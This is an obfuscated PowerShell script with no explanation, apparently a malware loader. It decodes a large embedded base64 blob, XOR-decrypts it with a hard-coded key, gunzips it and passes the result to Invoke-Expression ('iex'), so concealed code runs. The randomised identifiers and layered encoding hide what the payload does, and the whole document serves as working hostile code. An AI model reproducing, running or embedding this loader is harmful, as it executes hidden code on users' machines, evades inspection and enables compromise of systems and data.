$bxtgzp072eauc16 = [System.Text.Encoding]::ascii
function 6meoxdbuvw93qlpjga8fckhsnr5  {param($z97klx2c58uyb0v )
  $lduwapgn3zh8skv = [System.Convert]::FromBase64String($z97klx2c58uyb0v)
  $tqp817dmv5lyogr= $bxtgzp072eauc16.GetBytes("1ar670qwjtle")
    $7n81rycj0izmvg5 = $lduwapgn3zh8skv
    $n6zem2qbwrd31a7 = $(for ($aqokm8wy6re2vip = 0; $aqokm8wy6re2vip -lt $7n81rycj0izmvg5.length; ) {
        for ($5he0u2pr4bwmynz = 0; $5he0u2pr4bwmynz -lt $tqp817dmv5lyogr.length; $5he0u2pr4bwmynz++) {
            $7n81rycj0izmvg5[$aqokm8wy6re2vip] -bxor $tqp817dmv5lyogr[$5he0u2pr4bwmynz]
            $aqokm8wy6re2vip++
            if ($aqokm8wy6re2vip -ge $7n81rycj0izmvg5.Length) {
                $5he0u2pr4bwmynz = $tqp817dmv5lyogr.length
            }
        }
    })
	$n0mu6szjfi7cwer = New-Object System.IO.MemoryStream( , $n6zem2qbwrd31a7 )

	    $g0ebdx12wt76imq = New-Object System.IO.MemoryStream
        $ema9kiry1z8t0w3 = New-Object System.IO.Compression.GzipStream $n0mu6szjfi7cwer, ([IO.Compression.CompressionMode]::Decompress)
	    $ema9kiry1z8t0w3.CopyTo( $g0ebdx12wt76imq )
        $ema9kiry1z8t0w3.Close()
		$n0mu6szjfi7cwer.Close()
		[byte[]] $xep8czlidruas31 = $g0ebdx12wt76imq.ToArray()
 $4utlokbxa9y7gm6=$xep8czlidruas31
    return $4utlokbxa9y7gm6
}
[byte[]]$ntg1df6y2vlr5hm=6meoxdbuvw93qlpjga8fckhsnr5 $thubz4i56jlp8dk
[System.Text.Encoding]::ascii.GetString((6meoxdbuvw93qlpjga8fckhsnr5 "Lup6NjcwcXdudOEwXA7RDifODT+W8/2gmKgXdxN9yso8ifwRWPrJkOCnmQGFxrmvMGautla9ODXRjYNejcU/pcpg4Xfls6NZwq2q3q2+hkN52o7UsbWR5T7/zXuKLbtlnuU4LAK8obx8QJ2gzzICovnWbrfi7GYHnjgLLx7FwrfNBGaGyl0nGoV2Hd5GM9TU9uSNRkt8IuAZn+7MT88q7BcRhtEURH3pBWp4Mz2vM9Sscf8YNqOhFRg/l9Mz50UmXDALef9LVKa4LJf49AO8knW/Am4tCfbX8g+fhLru3WQ22VV/LqQjbdHe0rr11tUawZ/+QZdbMVlZS8w4NVNo5W+SdYMRSOfrJ5jTUqoJPgesSu14mnjYKwFmufPF9n8N8+cWI91xsZvG56SLVXCX1J52rMH83BlQbrHEi22dRo/VpgnZ/JZz+v4i+Nurs7fFPjrybdxr3MCZEd+JWYPBa3qeu1scbPskRySrfMnd66KBxJI5pLyJVOmYlwzRBtHB3+a/kVMa4pVvILszy7qPDCeZ0xbCH6Ow9Ycv99+qUN6a0stoAX4RGJfhweCRwgmEwq5Ugpcxh8WxWqpijJSKhitPtYZlNM6DLEO2J69XAFF+wFflx76TT9s2JUlyqzooGTRCkD5lcOt49+WcACxguR3KxP0lAEH/SH2ZaQ3NJ43RVQsnOHvD5Yp1YdAA29kCgESp5QL50w+kOOJvc2hFRLEHLoja5tg4H2zL9A8Vp00o/zQqDUC3wnXSM8QqcC9Njow/OcT+TeNtNTjSslT4Xcqhi0qM/Ovnc1MS6CMJ4VVqdZ86KwceMTT8BErLrLfg58SQmGCX9qi+h6A0r1FCX62CGWWMNIbrKZ3xcWekOeHMLCiOreZeG1D4+Nnnwwqa1qhmK4dB7dL4oDnGyXLl+mKBvWx/uWM1GiDoPjeroyJk0d31iFckjNhHe9pjjtCzsDVv9UtckaD1dZWOXUH0W+wur031Wpa4wpKs9olqyWD9ihM6/w9vwdFBR5uTgvkWRgp92OUf5omIG4u0iBeIwIeHAcy9ia1gSFy9Qxq5ZjvMdWcmIQ0TOKfm/Pt5SPmWRGR6H0/QersBEGqhaEcuFGanLBULK+YmuwqvPyypZeDEeahZr1CBRfO3hPjPZFs2fffSILlzXWcWkg7awmxLjp9LbIYmRsbVsVybUSbyLwaG0zPgm1cujw5JxFQlXr8qmhniA2g3cXc="))|iex;